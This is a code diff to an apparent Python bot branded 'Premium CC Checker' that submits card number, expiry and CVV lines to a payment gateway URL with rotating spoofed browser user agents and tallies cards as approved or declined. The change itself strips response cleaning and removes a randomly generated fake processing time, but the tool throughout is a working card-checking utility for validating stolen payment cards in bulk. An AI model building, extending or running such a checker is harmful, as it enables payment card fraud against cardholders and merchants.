@@ -212,25 +212,13 @@ Contact @mhitzxg for
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
         ])
 
-    def clean_response(self, text):
-        """Clean response by removing unwanted formatting"""
-        # Remove box characters and emojis that break formatting
-        text = re.sub(r'[┏┓┗┛━↯🛒💳📩🏦🌎🕒⏱️👑💥]', '', text)
-        # Remove multiple spaces
-        text = re.sub(r'\s+', ' ', text).strip()
-        # Remove duplicate newlines
-        text = re.sub(r'\n+', '\n', text)
-        # Remove any remaining special characters that might break Markdown
-        text = re.sub(r'([_*\[\]()~`>#+\-=|{}.!])', r'\\\1', text)
-        return text
-
     def check_card(self, cc_line):
-        """Check card via gateway and return cleaned response"""
+        """Check card via gateway and return raw response"""
         try:
             url = f"{GATEWAY_URL}?lista={cc_line}"
             headers = {"User-Agent": self.generate_user_agent()}
             response = requests.get(url, headers=headers, timeout=20)
-            return self.clean_response(response.text)
+            return response.text.strip()  # Return raw response without any cleaning
         except Exception as e:
             logger.error(f"Gateway error: {e}")
             return f"❌ Gateway Error: {str(e)}"
@@ -304,7 +292,7 @@ Contact @mhitzxg for
                 try:
                     time.sleep(processing_delay)
                     cc_parts = cc.split('|')
-                    result = self.check_card(cc)
+                    result = self.check_card(cc)  # Get raw response
                     
                     if any(x in result.lower() for x in ["charged", "cvv match", "approved"]):
                         approved += 1
@@ -313,15 +301,12 @@ Contact @mhitzxg for
                         declined += 1
                         status = "❌ DECLINED ❌"
                     
-                    # Format the result cleanly
-                    clean_result = "\n".join([line.strip() for line in result.split('\n') if line.strip()])
-                    
+                    # Keep the raw response format
                     results.append(f"""
 💳 *Card {index}:* `{cc_parts[0]}|{cc_parts[1]}|{cc_parts[2]}|{cc_parts[3]}`
 📊 *Status:* {status}
 📝 *Response:*
-{clean_result}
-⏱ *Time:* {random.uniform(0.8, 1.5):.2f}s
+{result}
 ------------------------------------
 """)
                     
@@ -493,11 +478,10 @@ Contact @mhitzxg for
             threading.Thread(target=loading_animation).start()
 
             try:
-                result = self.check_card(cc)
+                result = self.check_card(cc)  # Get raw response
                 stop_event.set()
                 
                 cc_parts = cc.split('|')
-                clean_result = "\n".join([line.strip() for line in result.split('\n') if line.strip()])
                 
                 response_text = f"""
 ╔═══════════════════════╗
@@ -505,7 +489,7 @@ Contact @mhitzxg for
 ╚═══════════════════════╝
 🔹 *Card:* `{cc_parts[0]}|{cc_parts[1]}|{cc_parts[2]}|{cc_parts[3]}`
 📝 *Response:*
-{clean_result}
+{result}
 
 🕒 {time.strftime('%Y-%m-%d %H:%M:%S')}
 ⚡ Powered by Premium CC Checker
